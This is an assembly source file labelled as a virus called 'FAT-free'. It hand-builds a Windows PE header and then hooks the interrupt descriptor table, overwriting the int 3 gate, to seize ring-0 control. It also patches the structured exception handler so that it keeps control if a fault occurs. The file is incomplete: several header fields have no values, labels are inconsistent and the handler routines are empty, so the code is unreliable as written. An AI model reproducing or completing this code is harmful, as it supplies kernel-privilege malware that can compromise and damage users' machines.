;****************
;* Information: *
;****************
;**
;* Name: FAT-free
;* Date: 11.02.2026, Version 1.0
;* Last modified: 11.02.2026
;**
;* Assembling:
;* nasm -f bin fat-free.asm -o fat-free.exe
;**
;*=====================================================*
;* Modification history *
;*=====================================================*
;* v1.0
;********************************************************

cpu 586
bits 32
org 400000h

;**********************************
;* PE and MZ Header, Do not touch *
;**********************************

Header:
.IMAGE_DOS_HEADER:
.e_magic dw 5A4Dh   ; MZ
.e_cblp dw 0090h
.e_cp dw 0003h
.e_crlc dw 0000h
.e_cparhdr dw 0004h
.e_minalloc dw 0000h
.e_maxalloc dw 0FFFFh
.e_ss dw 0000h
.e_sp dw 00B8h
.e_csum dw 0000h
.e_ip dw 0000h
.e_cs dw 0000h
.e_lfarlc dw 0040h
.e_ovno dw 0000h
.e_res times 4 dw 0
.e_oemid dw 0000h
.e_res2 times 10 dw 0
.e_lfanew dd PE_HEADER - IMAGE_DOS_HEADER

.DOS_stub:
push cs
pop ds
mov dx, .message - DOS_stub+40h
mov ah, 09h
int 21h
mov ax, 4C01h
int 21h
.message:
db "This program cannot be run in DOS mode.", 0Dh, 0Ah, "$"

times 128 - ($ - IMAGE_DOS_HEADER) db 0

.PE_HEADER:
.Signature db 'P', 'E', 0, 0  ; Signature
.Machine dw 014Ch ;i386
.NumberOfSections dw 
.TimeDateStamp dd
.PointerToSymbolTable dd
.NumberOfSymbols dd
.SizeOfOptionalHeader dw
.Characteristics dw

;********************************************
; End of Headers *
;********************************************

;********************************************
;* Constants *
;********************************************
HookExceptionNumber equ 3h

;********************************************
;* Virus Start *
;********************************************
virus_start:
push ebp
;******************************************
;* First order of buisness is *
;* to modify SEH So that if an exceptions *
;* occur we still have control *
;******************************************
lea eax, [esp-4h*2]

xor ebx, ebx
xchg eax, [fs:ebx]

call .get_delta
.get_delta:
pop ebx

lea ecx, [ebx+(ExceptionOccured-.get_delta)]

push ecx
push eax

;***************************
;* Now we need to actually *
;* Hook Int 3h *
;* To actually get Ring 0 *
;***************************

push eax
sidt [esp-02h]
pop ebx              ; EBX = base adress of idt

add ebx, HookExceptionNumber*08h+04h

cli

mov ebp, [ebx]
mov bp, [ebx-04h]

lea esi, [ecx+(IntHandler-ExceptionOccured)] ; ESI = Memory adress of 
                                             ; ExceptionOccured+(IntHandler-ExceptionOccured)
push esi
mov [ebx-04h], si
shr esi, 16
mov [ebx+2h], si
pop esi

int HookExceptionNumber    ; To get ring 0

ExceptionOccured:


IntHandler:

